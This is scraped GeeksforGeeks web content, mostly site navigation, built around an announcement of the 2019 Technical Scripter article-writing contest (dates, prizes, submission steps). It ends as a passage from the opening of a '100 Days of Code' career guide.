Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Topic wise multiple choice questions in computer science C Programming Mock Tests C++ Programming Mock Tests Java Programming Mock Tests Python Programming Mock Tests GATE Mock Tests Data Structures Mock Tests Algorithms Mock Tests Operating Systems Mock Tests DBMS Mock Tests Compiler Design Mock Tests Computer Networks Mock Tests Theory of Computation Mock Tests Computer Organization and Architecture Engineering Mathematics Aptitude Mock Tests CS Interview Questions C Programming Mock Tests Input and Output Operators Loops & Control Structure Structure & Union Macro & Preprocessor Arrays Pointer Basics String Functions Storage Classes and Type Qualifiers Data Types Dynamic Memory Allocation Misc Advanced Pointer Variable Declaration and Scope File Handling C Quiz – 101 C Quiz – 102 C Quiz – 103 C Quiz – 104 C Quiz – 105 C Quiz – 106 C Quiz – 107 C Quiz – 108 C Quiz – 109 C Quiz – 110 C Quiz – 111 C Quiz – 112 Data Structures Mock Tests Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees Graph Hash Array Misc B and B+ Trees Heap Tree Traversals Algorithms Mock Tests Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Operating Systems Mock Tests Process Management Memory Management Input Output Systems UNIX CPU Scheduling Deadlock C++ Programming Mock Tests Constructors References Class and Object Misc C++ Destructors Operator Overloading this pointer Function Overloading and Default Arguments Static Keyword friend keyword Inheritance const keyword new and delete Virtual Functions Templates Exception Handling Java Programming Mock Tests Inheritance Abstract Class and Interface Arrays Data Types Constructors Exception Handling Packages Class and Object Functions final keyword Operators Python Programming Mock Tests Functions Operators Miscellaneous Data Type Output GATE Mock Tests GATE CS 2012 GATE CS 2013 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE IT 2008 GATE-CS-2007 GATE-IT-2007 GATE-CS-2006 GATE-IT-2006 GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE-CS-2005 GATE-IT-2005 GATE-CS-2004 GATE-IT-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-2015 (Mock Test) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) DBMS Mock Tests ER and Relational Models Database Design (Normal Forms) SQL(29) Transactions and concurrency control File structures Compiler Design Mock Tests Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Computer Networks Mock Tests Data Link Layer Network Layer IP Addressing Transport Layer Misc Topics in Computer Networks Application Layer Network Security Theory of Computation Mock Tests Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Aptitude Mock Tests Puzzles Probability Arithmetic Aptitude Arithmetic Aptitude 3 Arithmetic Aptitude 5 Numbers Work and Wages English General Aptitude Arithmetic Aptitude 2 Arithmetic Aptitude 4 Arithmetic Aptitude 6 LCM HCF Computer Organization and Architecture Digital Logic & Number representation Computer Organization and Architecture Number Representation Microprocessor Other Topics in Computer Science Software Engineering HTML and XML Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic. CS Interview Questions C Interview Questions | Set 1 C Interview Questions | Set 2 C++ Interview Questions Data Structures Interview Questions Computer Networks Interview Questions Algorithm Interview Questions DBMS Interview Questions Operating Systems Interview Questions OOP Interview Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Topic wise multiple choice questions in computer science Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Topic wise multiple choice questions in computer science C Programming Mock Tests C++ Programming Mock Tests Java Programming Mock Tests Python Programming Mock Tests GATE Mock Tests Data Structures Mock Tests Algorithms Mock Tests Operating Systems Mock Tests DBMS Mock Tests Compiler Design Mock Tests Computer Networks Mock Tests Theory of Computation Mock Tests Computer Organization and Architecture Engineering Mathematics Aptitude Mock Tests CS Interview Questions C Programming Mock Tests Input and Output Operators Loops & Control Structure Structure & Union Macro & Preprocessor Arrays Pointer Basics String Functions Storage Classes and Type Qualifiers Data Types Dynamic Memory Allocation Misc Advanced Pointer Variable Declaration and Scope File Handling C Quiz – 101 C Quiz – 102 C Quiz – 103 C Quiz – 104 C Quiz – 105 C Quiz – 106 C Quiz – 107 C Quiz – 108 C Quiz – 109 C Quiz – 110 C Quiz – 111 C Quiz – 112 Data Structures Mock Tests Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees Graph Hash Array Misc B and B+ Trees Heap Tree Traversals Algorithms Mock Tests Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Operating Systems Mock Tests Process Management Memory Management Input Output Systems UNIX CPU Scheduling Deadlock C++ Programming Mock Tests Constructors References Class and Object Misc C++ Destructors Operator Overloading this pointer Function Overloading and Default Arguments Static Keyword friend keyword Inheritance const keyword new and delete Virtual Functions Templates Exception Handling Java Programming Mock Tests Inheritance Abstract Class and Interface Arrays Data Types Constructors Exception Handling Packages Class and Object Functions final keyword Operators Python Programming Mock Tests Functions Operators Miscellaneous Data Type Output GATE Mock Tests GATE CS 2012 GATE CS 2013 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE IT 2008 GATE-CS-2007 GATE-IT-2007 GATE-CS-2006 GATE-IT-2006 GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE-CS-2005 GATE-IT-2005 GATE-CS-2004 GATE-IT-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-2015 (Mock Test) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) DBMS Mock Tests ER and Relational Models Database Design (Normal Forms) SQL(29) Transactions and concurrency control File structures Compiler Design Mock Tests Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Computer Networks Mock Tests Data Link Layer Network Layer IP Addressing Transport Layer Misc Topics in Computer Networks Application Layer Network Security Theory of Computation Mock Tests Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Aptitude Mock Tests Puzzles Probability Arithmetic Aptitude Arithmetic Aptitude 3 Arithmetic Aptitude 5 Numbers Work and Wages English General Aptitude Arithmetic Aptitude 2 Arithmetic Aptitude 4 Arithmetic Aptitude 6 LCM HCF Computer Organization and Architecture Digital Logic & Number representation Computer Organization and Architecture Number Representation Microprocessor Other Topics in Computer Science Software Engineering HTML and XML Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic. CS Interview Questions C Interview Questions | Set 1 C Interview Questions | Set 2 C++ Interview Questions Data Structures Interview Questions Computer Networks Interview Questions Algorithm Interview Questions DBMS Interview Questions Operating Systems Interview Questions OOP Interview Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

The Technical Scripter Event 2019 By GeeksforGeeks - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Technical Scripter Event 2020 By GeeksforGeeksThe Technical Scripter Event 2019 By GeeksforGeeksWrite From Home Challenge – Technical Content Writing Event By GeeksforGeeksHow to Attempt and Analyse Mock CAT?Avoid these mistakes while preparing for the CAT ExamMust know things for CAT Exam 2019; Eligibility Criteria, Important Dates and SyllabusCAT Preparation 2019: A Complete Preparation Package You Require for Cracking CAT 2019CAT 2019 Preparation Strategy : How to Ace the CAT Exam in 4 MonthsWhat are the Daily Habits for Successful CAT Preparation?Special 21 – Coding Interview Preparation in 21 Days LockdownGet Your Dream Job With Amazon SDE Test SeriesAmazon Interview Experience | Set 414 (For SDET-1)Amazon interview Experience | Set 413 (SDET-1 On-Campus Internship)Amazon Interview Experience | Set 432 (SDET Off – Campus)How to Prepare for Amazon Software Development Engineering Interview?Resume Writing For InternshipMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, …Must Do Coding Questions Company-wisePractice for cracking any coding interviewHow to begin with Competitive Programming?Top 10 Algorithms and Data Structures for Competitive ProgrammingN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Socket Programming in C/C++GET and POST requests using PythonTop 10 Projects For Beginners To Practice HTML and CSS SkillsFast I/O for Competitive ProgrammingOOPs | Object Oriented Design The Technical Scripter Event 2019 By GeeksforGeeks Last Updated: 12-02-2020 Are you a technical geek? Do you love reading about the latest technologies like Quantum Computing or Data Science and then writing articles about them? Or maybe you are interested in programming languages like Python, Java, etc. and love exploring more about them? In either case, GeeksforGeeks has a great opportunity for you! We have created the Technical Scripter Event for all the Geeks like you who love learning new things and then sharing them with the world! This event will allow you to showcase your technical and writing skills and also win prizes for them. So it’s a win-win situation! The Technical Scripter Event gives you a chance to write and submit Technical Blogs or Articles based on any topic in the computer science world like cutting-edge technologies or programming languages. And the good news is that the deadline for this event has been extended to 11th February 2020 because of the overwhelming response from geeks like you! We have already received lots of articles so hurry up, submit your own articles and win exciting prizes at GeeksforGeeks! Highlights of the Technical Scripter Event This event is open from 20 September 2019 to 11 February 2020. You can write and Submit Technical Blogs, Articles or anything related to the computer science world. In-office internship opportunity for top 50 participants. Goodies (2 Pens, 1 Keychain) + INR 200 OFF coupon valid on all courses for all participants. Cash Prizes for the Top 5 Winners. The Winners would be declared on the Basis of Public Voting for select topics.* Chance to get Geek of the Month award. [*In case of any issues, GeeksforGeeks hold the right of final decision.] Benefits of Participating in the Event There are many benefits you can gain from the Technical Scripter Event. And we are not even talking about the prizes, those are just an extra bonus!!! So let’s see the benefits: Writing articles for the Technical Scripter Event will only improve your knowledge about the topics you are passionate about!!! It’s obvious that you’ll have to study these topics inside out which will make you the resident expert in the field you focus on. If you are a student preparing for the placement season, then this event is the best thing for you! You can write articles on topics like Algorithms & Data Structures, C, C++, Java, Python, etc. which will teach you in detail and also help with the technical interviews in your placements. If you participate and win in the Technical Scripter Event, it is a bonus that will add value to your resume. This will also help you shine in your interviews and secure your dream job! Topics to Write On You can write on any computer science topic in the Technical Scripter Event. However, this topic should not previously exist on GeeksforGeeks. If you are not sure about which topic you want to write on, then go to Write On Suggested Topic. There you can select the topic you want to write on by clicking on the Write option and then selecting Pick for Technical Scripter. Some of the different types of topics that you can select are mentioned in the list below. You can refer to them in case you are confused about which topic to pick but you are by no means restricted to only these topics. Algorithms & Data Structures Competitive Programming Programming Languages (C, C++, Java, Python, C#, Perl, Ruby, Scala, Go, Web Technology, etc.) Machine Learning and Data Science Tech Tips and Tricks Linux Hacks Secure Coding Technical Blogs Puzzles Design based articles Interesting Facts Cracking Technical Interviews Note: Articles on library functions are not accepted under the Technical Scripter Event. Prizes to be Won There are many Cash Prizes and Goodies to be won! 1st Prize: INR 10,000 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In Office Internship opportunity + INR 200 OFF coupon valid on all courses 2nd Prize: INR 7,500 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In Office Internship opportunity + INR 200 OFF coupon valid on all courses 3rd Prize: INR 5,000 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In Office Internship opportunity + INR 200 OFF coupon valid on all courses 4th Prize: INR 2,000 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In Office Internship opportunity + INR 200 OFF coupon valid on all courses 5th Prize: INR 2,000 Cash Prize + GeeksforGeeks Goodies’ bag + Certificate + In Office Internship opportunity + INR 200 OFF coupon valid on all courses 6th -10th Prize: GeeksforGeeks Goodies’ bag + In Office Internship opportunity + INR 200 OFF coupon valid on all courses 11th -50th Prize: Goodies(2 Pens, 1 Keychain) + In Office Internship opportunity + INR 200 OFF coupon valid on all courses Assured Reward* : Goodie (2 Pens, 1 Keychain) + INR 200 OFF coupon valid on all courses. * Each participant who manages to publish atleast one article will be rewarded. Note that under this Technical Scripter Event, cash prize payments will be done to only Indian bank account holders. How to Submit your Article? Want to write an article for the Technical Scripter Event? Then don’t waste too much time thinking and just go on and write one! These are the guidelines you can use to submit your article or blog at GeeksforGeeks: Click on https://contribute.geeksforgeeks.org/ and submit your article under Write in Technical-Scripter. If you are not sure which topic you want to write on, then Click on https://contribute.geeksforgeeks.org/ and go to Write On Suggested Topic. Then you can select the topic you want to write on by clicking on the WRITE option and then selecting Pick for Technical Scripter as shown in the image. Use these guidelines to write the article – https://contribute.geeksforgeeks.org/guide-to-write-an-article/ Any plagiarism detected in the article will disqualify the author. In case of any doubt please contact your respective Campus Ambassador or you can also drop a mail to contribute@geeksforgeeks.org. Useful links: How to choose a topic for writing an article? What are the benefits of interning as a content writer at GeeksforGeeks? My Personal Notes arrow_drop_up Save Recommended Posts:Technical Scripter Event 2020 By GeeksforGeeksWrite From Home Challenge - Technical Content Writing Event By GeeksforGeeksGRE General Practice Test Series 2019 | GeeksforGeeksGeeks Coding Challenge [GCC 2019] - A Three Day Coding Challenge By GeeksforGeeksCAT Preparation 2019: A Complete Preparation Package You Require for Cracking CAT 2019Top 5 Common Mistakes in Technical On-site InterviewsHow to get started for technical Interviews?Socio-technical SystemsCracking Technical Interviews; FreshersHow to crack any Technical InterviewCracking Technical Interviews13 Technical Skills You Should Have As A Developer8 Technical Courses To Get a Job in ITDifference between Research Papers and Technical Articles for Journal PublicationHow to Practice for the Technical Rounds in Interview?13 Mistakes To Avoid During Technical Interview7 Essential Tips To Become A Good Technical Leader7 Most In-Demand Technical Skills By Companies After COVID-19What is Technical Debt in Software Development and How to Manage It?Technical Documentation - Types, Required Skills, Challengesharkiran78Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : GBlogTechnical Scripter thumb_up 11 To-do Done 3 Based on 4 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Node.js | Buffer.byteLength() Method Next last_page How I Found a Bug In Facebook and Earned 500 Dollars? Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in GBlog 100 Days of Code - A Complete Guide For Beginners and ExperiencedWhy Java Language is Slower Than CPP for Competitive Programming?Differences between Procedural and Object Oriented ProgrammingVirtualization | A Machine Reference ModelSupervised and Unsupervised learning More related articles in GBlog Types of Software TestingWorking with csv files in PythonGenetic AlgorithmsXML parsing in PythonUnderfitting and Overfitting in Machine Learning room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

100 Days of Code - A Complete Guide For Beginners and Experienced - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ 100 Days of Code – A Complete Guide For Beginners and Experienced5 Common System Design Concepts for Interview PreparationTop 10 System Design Interview Questions and AnswersHow to Crack System Design Round in Interviews?Design Dropbox – A System Design Interview QuestionDesign Twitter – A System Design Interview QuestionGetting Started with System Design5 Tips to Crack Low-Level System Design InterviewsDesign an online book reader systemDesign a Logistics SystemDesign Snake GameDesign a Chess GameDesign a Hit CounterHow to design a tiny URL or URL shortener?Sort an array of 0s, 1s and 2sSort an array of 0s, 1s and 2s (Simple Counting)Segregate 0s and 1s in an arraySegregate Even and Odd numbersSort all even numbers in ascending order and then sort all odd numbers in descending orderSort even-placed elements in increasing and odd-placed in decreasing orderPermute two arrays such that sum of every pair is greater or equal to KChoose k array elements such that difference of maximum and minimum is minimizedSort an array when two halves are sortedFind pair with greatest product in arrayMinimum number of subsets with distinct elementsSocket Programming in C/C++GET and POST requests using PythonTop 10 Projects For Beginners To Practice HTML and CSS SkillsFast I/O for Competitive ProgrammingOOPs | Object Oriented Design 100 Days of Code – A Complete Guide For Beginners and Experienced Last Updated: 18-12-2020 Do you want to become a successful software developer and dreaming about getting into the big tech companies? Are you someone who is already working as a developer but looking for a big move in your career? Well, if you’re one of them then surely you might have tried to do some preparation and you might have tried to cover various topics. You make a plan, you try to follow your plan and you start doing preparation through various resources, tutorials, and videos. You start learning it but after a couple of days or months, you realize that you’re not going anywhere. You’re not making any progress and things are overwhelming for you. You’re not alone and it’s happening with so many newbie programmers and experienced developers. They try to learn to code, and they try to cover various topics but due to the lack of a good roadmap and guidance, things become messy and confusing for them. During their preparation, they miss out on a lot of important things to cover. To help you with this we have created a practical roadmap “100 days of code” based on a lot of research and the experience of software developers working in big tech companies. This roadmap will give you a complete guideline to build a strong coding habit and to achieve your goal as a software developer. All you just need is a laptop, a working internet connection, determination to solve problems regularly and within a few months, you can develop the coding 